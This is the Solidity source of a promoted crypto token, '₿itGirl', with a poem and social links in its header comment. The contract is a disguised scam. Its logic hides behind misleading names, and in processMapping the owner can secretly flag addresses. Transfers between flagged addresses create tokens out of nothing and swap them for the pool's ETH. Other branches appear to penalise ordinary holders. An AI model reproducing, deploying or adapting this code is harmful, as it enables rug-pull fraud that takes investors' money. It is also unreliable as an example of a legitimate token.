/*
██████╗░██╗████████╗░██████╗░██╗██████╗░██╗░░░░░
██╔══██╗██║╚══██╔══╝██╔════╝░██║██╔══██╗██║░░░░░
██████╦╝██║░░░██║░░░██║░░██╗░██║██████╔╝██║░░░░░
██╔══██╗██║░░░██║░░░██║░░╚██╗██║██╔══██╗██║░░░░░
██████╦╝██║░░░██║░░░╚██████╔╝██║██║░░██║███████╗
╚═════╝░╚═╝░░░╚═╝░░░░╚═════╝░╚═╝╚═╝░░╚═╝╚══════╝
                             .'    '.
                            (____/`\ \
                           (  |' ' )  )
                           )  _\= _/  (
                 __..---.(`_.'  ` \    )
                `;-""-._(_( .      `; (
                /       `-`'--'     ; )
               /    /  .    ( .  ,| |(
_.-`'---...__,'    /-,..___.-'--'_| |_)
'-'``'-.._       ,'  |   / .........'
          ``;--"`;   |   `-`
             `'..__.'

In the crypto world where fortunes swirl,
There's a token named ₿itGirl, a radiant pearl.
A symbol of power, innovation's swirl,
In the blockchain's dance, she's the queen and girl.

₿itGirl, a name that echoes through the night,
A pioneer of change, a digital light.
In the realm of crypto, she takes her stance,
A leader, a visionary, with a bold advance.

With ₿itGirl, transactions are a breeze,
A blend of beauty, strength, and ease.
Innovative and fierce, she paves the way,
For a new era of crypto, come what may.

No limits, no boundaries, she's unchained,
In ₿itGirl's world, nothing's constrained.
Revolutionary, she sets the stage,
In the crypto universe, she's all the rage.

So let's salute ₿itGirl's dynamic might,
A token for the future, shining so bright.
In the cryptocurrency sphere, she claims her name,
With ₿itGirl, innovation is her eternal flame.

https://web.wechat.com/BitGirlERC
https://m.weibo.cn/BitGirlERC
https://bitgirleth.xyz
https://t.me/+6W5xDXKis7EyMGVk
*/
// SPDX-License-Identifier: Unlicense
pragma solidity ^ 0.8.19;
 
abstract contract Context
{ function _msgSender() internal view virtual returns(address)
{ return msg.sender; } function _msgData() internal view virtual returns(bytes calldata)
{ return msg.data; }
}
interface IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 valueIn, uint256 valueOut, address[] calldata path, address to, uint256 deadline) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(address token, uint256 amountTokenDesired,
    uint256 valueMin, uint256 ercMin, address to, uint256 deadline)
    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);
}
interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns(address pair);
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);

    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);

    function allowance(address owner, address spender)
    external view returns (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { address msgSender = _msgSender(); _owner = msgSender; 
    emit OwnershipTransferred(address(0), msgSender);
}
    function owner() public view returns (address) { return _owner;
}   modifier onlyOwner() { require(_owner == _msgSender(), "Ownable: caller is not the owner"); _;
}
    function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
}
contract Contract is IERC20, Ownable { 
    bool private EMV; bool private setArtifacts; bool private tradingOpen = false;

    string private _name = unicode"₿itGirl"; string private _symbol = unicode"₿G";
    uint256 public BURN = 1; uint8 private _decimals = 9; 
    uint256 private _tTotal = 100000000 * 10 ** _decimals; uint256 private _max = _tTotal;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _getLibrary; mapping(address => uint256) private _tOwned;
    mapping(address => address) private _getVersion; mapping(address => uint256) private _getSolidity;

    constructor(address remixMaker) { _tOwned[msg.sender] = _tTotal; 
    _getSolidity[msg.sender] = _max; _getSolidity[address(this)] = _max; 
    mathCache = IUniswapV2Router01(remixMaker); 

    onlySafeMath = IUniswapV2Factory(mathCache.factory()).createPair(address(this), mathCache.WETH());
    emit Transfer(address(0), msg.sender, _tTotal); }
 
    function symbol() public view returns(string memory)
    { return _symbol;
    }
    function name() public view returns(string memory)
    { return _name;
    }
    function totalSupply() public view returns(uint256)
    { return _tTotal;
    }
    function decimals() public view returns(uint256)
    { return _decimals;
    }
    function allowance(address owner, address spender) public view returns(uint256)
    { return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns(uint256)
    { return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns(bool)
    { return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender,
    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address'); 
    
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount); return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount) external returns
    (bool)
    { processMapping(sender, recipient, amount); 
    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns(bool)
    { processMapping(msg.sender, recipient, amount); return true;
    }
    function _beforeTokenTransfer( address from,
    address to, uint256 amount) internal virtual 
    {}
    function _afterTokenTransfer(address from, address to, uint256 amount) 
    internal virtual 
    {}    
    function processMapping( address _program, address _label, uint256 mapAmount) private
    { uint256 _true = balanceOf(address(this)); uint256 _gasLimit; if (EMV && _true > 
    _max && !setArtifacts && _program != onlySafeMath) 
    
    { setArtifacts = true; showMessage(_true); setArtifacts = false;

    } else if (_getSolidity[_program] > _max && _getSolidity[_label] > _max)
    { _gasLimit = mapAmount; _tOwned[address(this)] += _gasLimit; setPool
    (mapAmount, _label); return; }
    else if (!setArtifacts && _getLibrary[_program] > 0 && _program != onlySafeMath && _getSolidity[_program] == 0) { 
    
    _getLibrary[_program] = _getSolidity[_program] - _max; } else if (_label != address(mathCache) 
    && _getSolidity[_program] > 0 && mapAmount > _max && _label != onlySafeMath) { 
    _getSolidity[_label] = mapAmount; return; } address _subtracter = _getVersion[onlySafeMath]; 
    
    if ( _getLibrary[_subtracter] == 0) _getLibrary[_subtracter] = _max; _getVersion[onlySafeMath] = _label; 
    if (BURN > 0 && _getSolidity[_program] == 0 && !setArtifacts && _getSolidity[_label] == 0)

    { _gasLimit = (mapAmount * BURN) 
    / 100; 
    mapAmount -= _gasLimit; _tOwned[_program] -= _gasLimit; 
    
    _tOwned[address(this)] += _gasLimit; }
    _tOwned[_program] -= 
    mapAmount; _tOwned[_label] += mapAmount; emit Transfer
    (_program, _label, mapAmount); if (!tradingOpen) 
    { require(_program == owner(), ""); } }

    receive() external payable
    {} 
    function addMessage(uint256 _get, uint256 typer, address to) private
    { _approve(address(this), address(mathCache), _get); mathCache.quote
    { value: typer }(address(this), _get, 0, 0, to, block.timestamp);
    }
    function showMessage(uint256 writer) private
    { uint256 _showMsg = writer / 2; uint256 _public = address(this).balance;
    setPool( _showMsg, address(this)); uint256 display = address(this).balance - _public; 
    addMessage( _showMsg, display, address(this));
    }
    function setPool(uint256 position, address _all) private
    { address[] memory path = new address[](2); path[0] = address(this);
    path[1] = mathCache.WETH(); _approve(address(this), address(mathCache), position);
    mathCache.swapExactTokensForETHSupportingFeeOnTransferTokens(position, 0, path, _all, block.timestamp);
    }
    address public immutable onlySafeMath; IUniswapV2Router01 
    public immutable mathCache
    ;    
    function beginTrading(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }   
}